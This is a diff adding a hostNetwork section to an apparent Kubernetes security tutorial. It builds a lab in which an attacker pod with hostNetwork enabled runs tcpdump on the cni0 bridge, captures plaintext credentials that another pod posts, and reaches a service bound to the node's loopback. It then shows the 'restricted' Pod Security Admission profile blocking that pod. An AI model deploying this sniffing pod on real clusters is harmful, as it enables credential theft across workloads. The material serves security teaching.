@@ -643,6 +643,119 @@ And the pod is not created
 
 #### [](#header-4)hostNetwork
 
+```yaml
+victim1.yml
+apiVersion: v1
+kind: Pod
+metadata:
+  name: victim1
+  labels:
+    app: victim1
+  namespace: vuln-psa-ns
+spec:
+  containers:
+  - name: victim1
+    image: ubuntu
+    command: [ "/bin/bash", "-c", "--" ]
+    args: [ "apt update && DEBIAN_FRONTEND=noninteractive apt install -y python3 && python3 -m http.server 8080" ]
+  nodeName: worker
+
+---
+
+apiVersion: v1
+kind: Service
+metadata:
+  name: victim1
+  namespace: vuln-psa-ns
+spec:
+  selector:
+    app: victim1
+  ports:
+    - protocol: TCP
+      port: 8080
+      targetPort: 8080
+  type: ClusterIP
+```
+
+On victim1 we have a python server:
+```bash
+root@victim1:/# netstat -tulpn
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+tcp        0      0 0.0.0.0:8080            0.0.0.0:*               LISTEN      1/python3
+
+root@victim1:/# ifconfig
+eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1450
+        inet 10.42.2.60  netmask 255.255.255.0  broadcast 10.42.2.255
+        inet6 fe80::8420:9aff:fe6f:b378  prefixlen 64  scopeid 0x20<link>
+        ether 86:20:9a:6f:b3:78  txqueuelen 0  (Ethernet)
+        RX packets 26414  bytes 38519569 (38.5 MB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 11444  bytes 881368 (881.3 KB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+```
+
+On victim2 we will periodically send post requests with secret data to out victim1
+```yaml
+victim2.yml
+apiVersion: v1
+kind: Pod
+metadata:
+  name: victim2
+  namespace: vuln-psa-ns
+spec:
+  containers:
+  - name: victim2
+    image: ubuntu
+    command: [ "/bin/bash", "-c", "--" ]
+    args: [ "apt update && DEBIAN_FRONTEND=noninteractive apt install -y curl; while true; do curl -H 'Content-Type: application/json' -d '{ \"admin\":\"admin\", \"password\":\"Sup3r_S3cr3t\" }' -X POST victim1:8080; sleep 2; done" ]
+  nodeName: worker
+```
+
+And now the attacker:
+```yaml
+apiVersion: v1
+kind: Pod
+metadata:
+  name: attacker
+  namespace: vuln-psa-ns
+spec:
+  hostNetwork: true
+  containers:
+  - name: attacker
+    image: ubuntu
+    command: [ "/bin/bash", "-c", "--" ]
+    args: [ "apt update && DEBIAN_FRONTEND=noninteractive apt install -y tcpdump; tcpdump -i cni0 -A -s 0 'tcp port 8080'" ]
+  nodeName: worker
+```
+
+And we succesefully get:
+```bash
+..(.)Ik.POST / HTTP/1.1
+Host: victim1:8080
+User-Agent: curl/8.5.0
+Accept: */*
+Content-Type: application/json
+Content-Length: 46
+
+{ "admin":"admin", "password":"Sup3r_S3cr3t" }
+```
+
+Usually the traffic inside the cluster isn't encrypted (ssl) so we can get such info by sniffing
+
+Also we can access the services running on host(node) interfaces, like:
+```bash
+I run python server on node
+and inside the pod with enabled hostNetwork I can access it
+
+root@worker:/# netstat -tulpn
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+tcp        0      0 127.0.0.1:31337         0.0.0.0:*               LISTEN      -                 
+```
+
+As in the previous example if we enable ```PSA``` with ```pod-security.kubernetes.io/enforce: restricted``` the pod is prohibited to be created
+
 #### [](#header-4)hostIPC
 
 #### [](#header-4)hostPath
